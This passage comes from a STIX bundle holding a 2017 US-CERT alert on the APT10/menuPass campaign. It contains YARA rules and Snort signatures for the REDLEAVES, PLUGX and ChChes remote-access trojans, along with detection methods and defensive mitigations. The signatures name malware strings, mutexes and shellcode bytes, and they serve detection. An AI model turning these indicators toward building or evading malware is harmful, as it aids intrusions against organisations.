= {73 64 65 5e 60 74 75 74 6c 6f 60 6d 5e 6d 64 60 77 64 72 5e 65 6d 6d 6c 60 68 6f 2f 65 6d 6d} // This is 'red_autumnal_leaves_dllmain.dll' XOR'd with 0x01</code></p><p><code>    condition:</code></p><p><code>        any of them</code></p><p><code>}</code></p></td></tr><tr><td style=\"width: 100%; height: 27px;\"><p><code>rule REDLEAVES_CoreImplant_UniqueStrings {</code></p><p><code>    meta:</code></p><p><code>        description = \"Strings identifying the core REDLEAVES RAT in its deobfuscated state\"</code></p><p><code>        author = \"USG\"</code></p><p><code>    strings:</code></p><p><code>        $unique2 = \"RedLeavesSCMDSimulatorMutex\" nocase wide ascii</code></p><p><code>        $unique4 = \"red_autumnal_leaves_dllmain.dll\" wide ascii</code></p><p><code>        $unique7 = \"\\\\NamePipe_MoreWindows\" wide ascii</code></p><p><code>    condition:</code></p><p><code>      any of them</code></p><p><code>}</code></p></td></tr></tbody></table><div style=\"clear: both;\"> </div><p><em>Table 10: PLUGX Network Signatures</em></p><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\" width=\"100%\"><tbody><tr><td style=\"width: 100%; height: 60px;\"><p><code>alert tcp any any -&gt; any any (msg:\"Non-Std TCP Client Traffic contains 'HX1|3a|' 'HX2|3a|' 'HX3|3a|' 'HX4|3a|' (PLUGX Variant)\"; sid:XX; rev:1; flow:established,to_server; content:\"Accept|3a 20 2a 2f 2a|\"; nocase; content:\"HX1|3a|\"; distance:0; within:6; fast_pattern; content:\"HX2|3a|\"; nocase; distance:0; content:\"HX3|3a|\"; nocase; distance:0; content:\"HX4|3a|\"; nocase; distance:0; classtype:nonstd-tcp; priority:X;)</code></p></td></tr><tr><td style=\"width: 100%; height: 60px;\"><p><code>alert tcp any any -&gt; any any (msg:\"Non-Std TCP Client Traffic contains 'X-Session|3a|''X-Status|3a|''X-Size|3a|''X-Sn|3a|'(PLUGX)\"; sid:XX; rev:1; flow:established,to_server; content:\"X-Session|3a|\"; nocase; fast_pattern; content:\"X-Status|3a|\"; nocase; distance:0; content:\"X-Size|3a|\"; nocase; distance:0; content:\"X-Sn|3a|\"; nocase; distance:0; classtype:nonstd-tcp; priority:X;)</code></p></td></tr><tr><td style=\"width: 100%; height: 60px;\"><p><code>alert tcp any any -&gt; any any (msg:\"Non-Std TCP Client Traffic contains 'MJ1X|3a|' 'MJ2X|3a|' 'MJ3X|3a|' 'MJ4X|3a|' (PLUGX Variant)\"; sid:XX; rev:1; flow:established,to_server; content:\"MJ1X|3a|\"; nocase; fast_pattern; content:\"MJ2X|3a|\"; nocase; distance:0; content:\"MJ3X|3a|\"; nocase; distance:0; content:\"MJ4X|3a|\"; nocase; distance:0; classtype:nonstd-tcp; priority:X;)</code></p></td></tr><tr><td style=\"width: 100%; height: 60px;\"><p><code>alert tcp any any -&gt; any any (msg:\"Non-Std TCP Client Traffic contains 'Cookies|3a|' 'Sym1|2e|' '|2c|Sym2|2e|' '|2c|Sym3|2e|' '|2c|Sym4|2e|' (Chches Variant)\"; sid:XX; rev:1; flow:established,to_server; content:\"Cookies|3a|\"; nocase; content:\"Sym1|2e|0|3a|\"; nocase; distance:0; fast_pattern; content:\"|2c|Sym2|2e|\"; nocase; distance:0; content:\"|2c|Sym3|2e|\"; nocase; distance:0; content:\"|2c|Sym4|2e|\"; nocase; distance:0; classtype:nonstd-tcp; priority:X;)</code></p></td></tr></tbody></table><div style=\"clear: both;\"> </div><h4>Host Signatures</h4><p><em>Table 11: PLUGX and REDLEAVES YARA Signatures</em></p><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\" width=\"100%\"><tbody><tr><td style=\"width: 100%; height: 60px;\"><p><code>rule PLUGX_RedLeaves</code></p><p><code>{</code></p><p><code>meta:</code></p><p><code>author = \"US-CERT Code Analysis Team\"</code></p><p><code>date = \"03042017\"</code></p><p><code>incident = \"10118538\"</code></p><p><code>date = \"2017/04/03\"</code></p><p><code>MD5_1 = \"598FF82EA4FB52717ACAFB227C83D474\"</code></p><p><code>MD5_2 = \"7D10708A518B26CC8C3CBFBAA224E032\"</code></p><p><code>MD5_3 = \"AF406D35C77B1E0DF17F839E36BCE630\"</code></p><p><code>MD5_4 = \"6EB9E889B091A5647F6095DCD4DE7C83\"</code></p><p><code>MD5_5 = \"566291B277534B63EAFC938CDAAB8A399E41AF7D\"</code></p><p><code>info = \"Detects specific RedLeaves and PlugX binaries\"</code></p><p><code>strings:</code></p><p><code>$s0 = { 80343057403D2FD0010072F433C08BFF80343024403D2FD0010072F4 }</code></p><p><code>$s1 = \"C:\\\\Users\\\\user\\\\Desktop\\\\my_OK_2014\\\\bit9\\\\runsna\\\\Release\\\\runsna.pdb\"</code></p><p><code>$s2 = \"d:\\\\work\\\\plug4.0(shellcode)\"</code></p><p><code>$s3 = \"\\\\shellcode\\\\shellcode\\\\XSetting.h\"</code></p><p><code>$s4 = { 42AFF4276A45AA58474D4C4BE03D5B395566BEBCBDEDE9972872C5C4C5498228 }</code></p><p><code>$s5 = { 8AD32AD002D180C23830140E413BCB7CEF6A006A006A00566A006A00 }</code></p><p><code>$s6 = { EB055F8BC7EB05E8F6FFFFFF558BEC81ECC8040000535657 }</code></p><p><code>$s7 = { 8A043233C932043983C10288043283F90A7CF242890D18AA00103BD37CE2891514AA00106A006A006A0056 }</code></p><p><code>$s8 = { 293537675A402A333557B05E04D09CB05EB3ADA4A4A40ED0B7DAB7935F5B5B08 }</code></p><p><code>$s9 = \"RedLeavesCMDSimulatorMutex\"</code></p><p><code>condition:</code></p><p><code>$s0 or $s1 or $s2 and $s3 or $s4 or $s5 or $s6 or $s7 or $s8 or $s9</code></p><p><code>}</code></p></td></tr></tbody></table><div style=\"clear: both;\"> </div><h4>Other Detection Methods</h4><p><strong>Examine Port/Protocol Mismatches:</strong> Examine network traffic where the network port and protocol do not match, such as plaintext HTTP over port 443.</p><p><strong>Administrative Share Mapping:</strong> When a malicious actor tries to move laterally on a network, one of the techniques is to mount administrative shares to perform operations like uploading and downloading resources or executing commands. In addition, tools like System Internals PSEXEC will mount the shares automatically for the user. Since administrators may map administrative shares legitimately while managing components of the network, this must be taken into account.</p><ul><li>Filter network traffic for SMB mapping events and group the events by source IP, destination IP, the mounted path (providing a count of total mounts to that path), the first map time, and the last map time</li><li>Collect Windows Event Logs – Event ID 5140 (network share object was accessed) can be used to track C$ and ADMIN$ mounts by searching the Share Name field</li></ul><p><strong>VPN User authentication mismatch:</strong> A VPN user authentication match occurs when a user account authenticates to an IP address but once connected the internal IP address requests authentication tokens for other users. This may create false positives for legitimate network administrators but if this is detected, organizations should verify that the administrative accounts were legitimately used.</p><p><strong>VPN activity from VPS providers:</strong> While this may also produce false positives, VPN logins from Virtual Private Server (VPS) providers may be an indicator of VPN users attempting to hide their source IP and should be investigated.</p>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include:</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul>\t\t\n\t\t<h3>Solution</h3>\n\t\t<p>Properly implemented defensive techniques and programs make it more difficult for an adversary to gain access to a network and remain persistent yet undetected. When an effective defensive program is in place, actors should encounter complex defensive barriers. Actor activity should also trigger detection and prevention mechanisms that enable organizations to contain and respond to the intrusion more rapidly. There is no single or set of defensive techniques or programs that will completely avert all malicious activities. Multiple defensive techniques and programs should be adopted and implemented in a layered approach to provide a complex barrier to entry, increase the likelihood of detection, and decrease the likelihood of a successful compromise. This layered mitigation approach is known as defense-in-depth.</p><p>NCCIC mitigations and recommendations are based on observations made during the hunt, analysis, and network monitoring for threat actor activity, combined with client interaction.</p><h4>Whitelisting</h4><ul><li>Enable application directory whitelisting through Microsoft Software Restriction Policy (SRP) or AppLocker;</li><li>Use directory whitelisting rather than trying to list every possible permutation of applications in an environment. Safe defaults allow applications to run from PROGRAMFILES, PROGRAMFILES(X86), and SYSTEM32. All other locations should be disallowed unless an exception is granted.</li><li>Prevent the execution of unauthorized software by using application whitelisting as part of the security hardening of operating systems insulating.</li><li>Enable application directory whitelisting via the Microsoft SRP or AppLocker.</li></ul><h4>Account Control</h4><ul><li>Decrease a threat actor’s ability to access key network resources by implementing the principle of least privilege.</li><li>Limit the ability of a local administrator account to login from a local interactive session (e.g., “Deny access to this computer from the network”) and prevent access via a Remote Desktop Protocol session.</li><li>Remove unnecessary accounts, groups, and restrict root access.</li><li>Control and limit local administration.</li><li>Make use of the Protected Users Active Directory group in Windows Domains to further secure privileged user accounts against pass-the-hash compromises.</li></ul><h4>Workstation Management</h4><ul><li>Create a secure system baseline image and deploy to all workstations.</li><li>Mitigate potential exploitation by threat actors by following a normal patching cycle for all operating systems, applications, software, and all third-party software.</li><li>Apply asset and patch management processes.</li><li>Reduce the number of cached credentials to one if a laptop, or zero if a desktop or fixed asset.</li></ul><h4>Host-Based Intrusion Detection</h4><ul><li>Configure and monitor system logs through host-based intrusion detection system (HIDS) and firewall.</li><li>Deploy an anti-malware solution to prevent spyware, adware, and malware as part of the operating system security baseline.</li><li>Monitor antivirus scan results on a regular basis.</li></ul><h4>Server Management</h4><ul><li>Create a secure system baseline image, and deploy to all servers.</li><li>Upgrade or decommission end-of-life non Windows servers.</li><li>Upgrade or decommission servers running Windows Server 2003 and older versions.</li><li>Implement asset and patch management processes.</li><li>Audit for and disable unnecessary services.</li></ul><h4>Server Configuration and Logging</h4><ul><li>Establish remote server logging and retention.</li><li>Reduce the number of cached credentials to zero.</li><li>Configure and monitor system logs via a centralized security information and event management (SIEM) appliance.</li><li>Add an explicit DENY for “%USERPROFILE%”.</li><li>Restrict egress web traffic from servers.</li><li>In Windows environments, utilize Restricted Admin mode or remote credential guard to further secure remote desktop sessions against pass-the-hash compromises.</li><li>Restrict anonymous shares.</li><li>Limit remote access by only using jump servers for such access.</li></ul><h4>Change Control</h4><ul><li>Create a change control process for all implemented changes.</li></ul><h4>Network Security</h4><ul><li>An Intrusion Detection System (IDS) should:<ul style=\"list-style-type: circle;\"><li>Implement continuous monitoring.</li><li>Send alerts to a SIEM tool.</li><li>Monitor internal activity (this tool may use the same tap points as the netflow generation tools).</li></ul></li><li>Netflow Capture should:<ul style=\"list-style-type: circle;\"><li>Set a minimum retention period of 180 days.</li><li>Capture netflow on all ingress and egress points of network segments, not just at the Managed Trusted Internet Protocol Services (MTIPS) or Trusted Internet Connections (TIC) locations.</li></ul></li><li>Network Packet Capture (PCAP):<ul style=\"list-style-type: circle;\"><li>Retain PCAP data for a minimum of 24 hours.</li><li>Capture traffic on all ingress and egress points of the network.</li></ul></li><li>Use a virtual private network (VPN):<ul style=\"list-style-type: circle;\"><li>Maintain site-to-site VPN with customers.</li><li>Authenticate users utilizing site-to-site VPNs through adaptive security appliance (ASA).</li></ul></li><li>Use authentication, authorization, and accounting (AAA) for controlling network access.<ul style=\"list-style-type: circle;\"><li>Require Personal Identity Verification (PIV) authentication to an HTTPS page on the ASA in order to control access. Authentication should also require explicit rostering of PIV distinguished names (DNs) that are permitted to enhance the security posture on both networks participating in the site-to-site VPN.</li><li>Establish appropriate secure tunneling protocol and encryption.</li><li>Strengthen router configuration (e.g., avoid enabling remote management over the Internet and using default IP ranges; automatically logout after configuring routers; use encryption).</li><li>Turn off Wi-Fi protected setup (WPS), enforce the use of strong passwords, keep router firmware up-to-date; and</li><li>Improve firewall security (e.g., enable auto updates, revise firewall rules as appropriate, implement whitelists, establish packet filtering, enforce the use of strong passwords, and encrypt networks).</li></ul></li><li>Conduct regular vulnerability scans of the internal and external networks and hosted content to identify and mitigate vulnerabilities.</li><li>Define areas within the network that should be segmented to increase visibility of lateral movement by an adversary and increase the defense in-depth posture.</li><li>Develop a process to block traffic to IP addresses and domain names that have been identified as being used to aid previous malicious activities.</li></ul><h4>Network Infrastructure Recommendations</h4><ul><li>Ensure you are following National Security Agency (NSA) network device integrity (NDI) <a href=\"https://www.iad.gov/iad/library/reports/network-device-integrity-ndi-methodology.cfm\">best practices</a>.</li><li>Ensure your networking equipment has the latest available operating system and patches.</li></ul><h4>Host Recommendations</h4><ul><li>Implement policies to block workstations-to-workstation remote desktop protocol (RDP) connections through group policy object (GPO) on Windows, or a similar mechanism.</li><li>Store system logs of mission critical systems for at least one year within a SIEM.</li><li>Review the configuration of application logs to verify fields being recorded will contribute to an incident response investigation.</li></ul><h4>Users Management</h4><ul><li>Immediately set the password policy to require complex passwords for all users (minimum of 15 characters); this new requirement should be enforced as user passwords expire.</li><li>Reduce the number of domain and enterprise administrator accounts.</li><li>Create non-privileged accounts for privileged users and ensure they use the non-privileged account for all non-privileged access (e.g., web browsing, email access);</li><li>If possible, use technical methods to detect or prevent browsing by privileged accounts (authentication to web proxies would enable blocking of domain administrators).</li><li>Use two-factor authentication (e.g., security tokens for remote access and to any sensitive data repositories);</li><li>If soft tokens are used, they should not exist on the same device that is requesting remote access (laptop), and instead should be on a telephone or other out-of-band device.</li><li>Create privileged role tracking;<ul style=\"list-style-type: circle;\"><li>Create a change control process to all privilege escalations and role changes on user accounts;</li><li>Enable alerts on privilege escalations and role changes; and</li><li>Log privileged user changes in the environment and alert on unusual events.</li></ul></li><li>Establish least privilege controls; and</li><li>Implement a security-awareness training program.</li></ul><h4>Best Practices</h4><ul><li>Implement a vulnerability assessment and remediation program.</li><li>Encrypt all sensitive data in transit and at rest.</li><li>Create an insider threat program.</li><li>Assign additional personnel to review logging and alerting data.</li><li>Complete independent security (not compliance) audit.</li><li>Create an information sharing program.</li><li>Complete and maintain network and system documentation to aid in timely incident response, including:<ul style=\"list-style-type: circle;\"><li>network diagrams,</li><li>asset owners,</li><li>type of asset, and</li><li>an up-to-date incident response plan.</li></ul></li></ul>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t\t<li><a href=\"\">PaloAltoNetworks: “menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations” </a></li>\n\t\t\t\t\t<li><a href=\"\">FireEye: “APT10 (Menupass Team) Renews Operations Focused on Nordic Private Industry; operations Extend to Global Partners”. Feb</a></li>\n\t\t\t\t\t<li><a href=\"\">CyLance: “The Deception Project: A New Japanese-Centric Threat” </a></li>\n\t\t\t\t\t<li><a href=\"\">PwC/BAE Systems: “Operation Cloud Hopper: Exposing a systematic hacking operation with an unprecedented web of global victims: A</a></li>\n\t\t\t\t\t<li><a href=\"http://blog.jpcert.or.jp/2017/04/redleaves---malware-based-on-open-source-rat.html\">JPCERT/CC: “RedLeaves-Malware Based on Open Source Rat” </a></li>\n\t\t\t\t\t<li><a href=\"\">NCC Group: “RedLeaves Implant-Overview” </a></li>\n\t\t\t\t\t<li><a href=\"\">National Cyber Security Centre: “Infrastructure Update Version 1.0\" Reference: March 17, 2017”</a></li>\n\t\t\t\t\t<li><a href=\"\">FireEye: “BUGJUICE Malware Profile”. April 05, 2017 11:45:00 AM, 17-00003261, Version: 1</a></li>\n\t\t\t\t\t<li><a href=\"http://blog.jpcert.or.jp/2017/02/chches-malware--93d6.html\">JPCERT/CC: “ChChes- Malware that Communicates with C&amp;C Servers Using Cookie Headers” </a></li>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>April 27, 2017: Initial post</li>\n\t\t\t\t\t\t<li>April 28, 2017: Updated guidance under the sub-section: Network Infrastructure Recommendations</li>\n\t\t\t\t\t\t<li>May 2, 2017: In table 11, fixed trailing quote on date</li>\n\t\t\t\t\t\t<li>May 11, 2017: STIX and XLSX package was updated</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2017-04-27T22:50:51.000Z"
		}
	],
	"type": "bundle",
	"id": "stix-archive-bundle",
	"spec_version": "2.0"
}